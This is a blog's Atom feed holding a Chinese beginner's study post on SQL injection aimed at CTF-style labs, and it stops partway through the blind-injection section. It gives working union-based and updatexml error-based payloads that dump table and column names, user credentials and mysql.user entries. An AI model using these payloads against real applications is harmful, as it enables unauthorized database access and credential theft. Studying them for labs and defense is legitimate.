<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://StarofEden.github.io</id>
    <title>StarofEden🌸 • Posts by &#34;web安全&#34; tag</title>
    <link href="https://StarofEden.github.io" />
    <updated>2023-03-24T16:00:00.000Z</updated>
    <category term="火狐插件" />
    <category term="web安全" />
    <category term="博客美化" />
    <category term="ctf" />
    <category term="blog 博客美化" />
    <entry>
        <id>https://starofeden.github.io/2023/03/25/sql%E6%B3%A8%E5%85%A5/</id>
        <title>sql注入</title>
        <link rel="alternate" href="https://starofeden.github.io/2023/03/25/sql%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;h1 id=&#34;从0开始的sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#从0开始的sql注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;从 0 开始的 sql 注入&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;burpsuite-fuzz&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burpsuite-fuzz&#34;&gt;#&lt;/a&gt; burpsuite fuzz&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Fuzz testing 是生成大量数据并且对系统产生大量异常请求，通过大量恶意请求查找漏洞。在这个过程中我们可以依赖于部分工具来实现参数化，本文以 burpsuite 为工具以文件上传为例，可用此爆破过滤的关键字&lt;/li&gt;
&lt;li&gt;遇到的问题：&lt;br&gt;
在爆破时遇到报错：Too Many Reqests!&lt;br&gt;
 将线程数改为 1，时间间隔改小一点&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;查询所有数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询所有数据&#34;&gt;#&lt;/a&gt; 查询所有数据：&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1 or 1=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;常用语句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#常用语句&#34;&gt;#&lt;/a&gt; 常用语句&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;常用函数：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;database()	//查询数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;user()		//当前数据库用户名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;version()	//MySQL 版本&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;爆表&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;爆字段名&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&amp;#x27;users&amp;#x27;--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;相应字段内容&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; union select 1,2,group_concat(id,&amp;#x27;:&amp;#x27;,username,&amp;#x27;:&amp;#x27;,password) from users --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;1sql基本语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1sql基本语法&#34;&gt;#&lt;/a&gt; 1.sql 基本语法&lt;/h2&gt;
&lt;h3 id=&#34;11-sql-select&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11-sql-select&#34;&gt;#&lt;/a&gt; 1.1 sql select&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; column1,column2 &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; table_name;     &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;从表中选取列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; table_name;       &lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;从表中选取所有列&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;column：(列) 字段名&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;12-where子句&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#12-where子句&#34;&gt;#&lt;/a&gt; 1.2 where 子句&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;WHERE 子句用于提取那些满足指定条件的记录。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; websites &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; coutry &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;CN&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;字符要用单引号括起来，数字不用&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&#34;13-and-or运算符&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#13-and-or运算符&#34;&gt;#&lt;/a&gt; 1.3 AND &amp;amp; OR 运算符&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;and&lt;/td&gt;
&lt;td&gt;显示两个条件都成立的记录&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;or&lt;/td&gt;
&lt;td&gt;两个条件只要有一个成立，就显示其记录&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;14-order-by&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#14-order-by&#34;&gt;#&lt;/a&gt; 1.4 order by&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ORDER BY 关键字用于对结果集进行排序。&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;SELECT&lt;/span&gt; column1, column2 &lt;span class=&#34;keyword&#34;&gt;FROM&lt;/span&gt; table_name &lt;span class=&#34;keyword&#34;&gt;ORDER&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;BY&lt;/span&gt; column1, column2, ... &lt;span class=&#34;keyword&#34;&gt;ASC&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;DESC&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;column1,column2&lt;/strong&gt;: 要排序的字段名&lt;br&gt;
&lt;strong&gt; ASC&lt;/strong&gt;：表示按升序排序。&lt;br&gt;
&lt;strong&gt;DESC&lt;/strong&gt;：表示按降序排序。&lt;br&gt;
&lt;em&gt;默认为升序&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-mysql知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-mysql知识点&#34;&gt;#&lt;/a&gt; 2. mysql 知识点&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;union select&lt;/td&gt;
&lt;td&gt;联合查询，判断哪些地方可被替代，并在网页上显示出来&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;database()&lt;/td&gt;
&lt;td&gt;回显当前数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;version()&lt;/td&gt;
&lt;td&gt;查看当前竖起来版本&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;group_concat()&lt;/td&gt;
&lt;td&gt;把产生的同一分组中的值用，连接，形成一个字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;information_schema&lt;/td&gt;
&lt;td&gt;存了很多 mysql 信息的数据库&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;联合查询&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#联合查询&#34;&gt;#&lt;/a&gt; 联合查询：&lt;/h3&gt;
&lt;p&gt;当联合查询的数据不存在时就会创造一个虚拟数据，如：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;C:%5CUsers%5Cdell%5CDesktop%5C%E7%AC%94%E8%AE%B0%5C7e5d981f76a54e22b2ce3b6a13287b46.png&#34; alt=&#34;7e5d981f76a54e22b2ce3b6a13287b46&#34;&gt;&lt;br&gt;
 若后端查询语句是先通过查询用户名再进行密码的判断，就可以生成一个虚拟的密码，然后就可以通过查询的虚拟数据生成的密码来登录&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常密码被 md5 加密，可传入 md5 加密后的密码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;23可以代替&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#23可以代替&#34;&gt;#&lt;/a&gt; &lt;strong&gt;%23 可以代替#&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;information_schema.schemata&lt;/strong&gt;        information_schema 库的一个表，名为 schemata, 存储数据库名的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;schema_name&lt;/strong&gt;:schemata 表中存储 mysql 所有数据库名字的字段&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;information_schema.tables&lt;/strong&gt; 存了 mysql 所有的表名&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TABLE_SCHEMA 表示表所属的数据库名称；&lt;/li&gt;
&lt;li&gt;TABLE_NAME 表示所属的表的名称&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;information_schema.columns&lt;/strong&gt;  表存了所有的列的信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;COLUMN_NAME 表示字段名，当你知道一个表的名字时，可通过此字段获得表中的所有字段名 (列名)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;关于 and 1=2  &lt;strong&gt;用来判断是数字型注入还是字符型注入&lt;/strong&gt;&lt;br&gt;
 &lt;code&gt;若在GET请求中?id=1 and 1=1和?id=1 and 1=2都没有报错，则是字符型注入。&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;若id=1 and 1=1没有报错，但是?id=1 and 1=2有异常或没回显，则是数字型注入。&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3搜索型注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3搜索型注入&#34;&gt;#&lt;/a&gt; 3. 搜索型注入&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select from 表名 where username like &amp;#x27; %k% &amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;构造闭合：%’&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4insert注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4insert注入&#34;&gt;#&lt;/a&gt; 4.insert 注入&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;语句：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;insert into member(username,pw,sex,phonenum,email,address) values(&amp;#x27;必填字段&amp;#x27;,&amp;#x27;必填字段&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,&amp;#x27;xx&amp;#x27;,)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;playload:&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bob&amp;#x27; or updatexml(1,concat(0x7e,database()),0) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;5盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5盲注&#34;&gt;#&lt;/a&gt; 5. 盲注&lt;/h2&gt;
&lt;h3 id=&#34;31报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31报错注入&#34;&gt;#&lt;/a&gt; 3.1 报错注入&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;delete/update/insert&lt;/li&gt;
&lt;li&gt;使用条件：页面有数据库的报错信息&lt;/li&gt;
&lt;li&gt;判断是否报错&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;#x27; -- a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;相关知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#相关知识&#34;&gt;#&lt;/a&gt; 相关知识：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;updatexml&lt;/strong&gt;&lt;br&gt;
updatexml(xml_doument,XPath_string,new_value)&lt;br&gt;
 第一个参数：XML 的内容&lt;br&gt;
第二个参数：是需要 update 的位置 XPATH 路径&lt;br&gt;
第三个参数：是更新后的内容&lt;br&gt;
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式&lt;/li&gt;
&lt;li&gt;0x7e 为符号’~&#39;，因为不符合 xpath 语法，因此会报错，并把校验失败的东西爆出来。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;一些名词&lt;br&gt;
 &lt;code&gt;column_name:列的名称&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Information_schema.columns:表示所有的列的信息&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Information_schema:表示所有信息，包括库、表、列&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Information_schema.tables:表示所有的表的信息&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;table_schema:数据库的名称&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;table_name:表的名称&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;注入方式：&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;查库&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updataxml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,database(),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查表&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updatexml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; (group_concat(table_name)) &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;database()),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查列名&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updatexml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; (group_concat(column_name)) &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_name&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查 flag 列内容&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; updatexml(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,concat(&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; (group_concat(flag)) &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; sqli.flag ),&lt;span class=&#34;number&#34;&gt;0x7e&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;长度限制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#长度限制&#34;&gt;#&lt;/a&gt; 长度限制&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;limit：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) -- a	//limit 0,1为展示第0条数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;substr():&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1&amp;#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from mysql.user), 1 , 31)),3) -- a&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;布尔盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#布尔盲注&#34;&gt;#&lt;/a&gt; 布尔盲注&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;特征：&lt;br&gt;
1. 没有报错信息&lt;br&gt;
 2. 不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是 0 或者 1)&lt;br&gt;
 3. 在正确的输入下，输入 and 1=1/and 1= 2 发现可以判断&lt;br&gt;
 4. 步骤：&lt;/li&gt;
&lt;li&gt;用？id=1’ and 1=1–+ 和？id=1’ and 1=2–+ 验证&lt;/li&gt;
&lt;li&gt;获取长度&lt;/li&gt;
&lt;li&gt;一个一个猜测 flag 的内容：&lt;/li&gt;
&lt;/ul&gt;
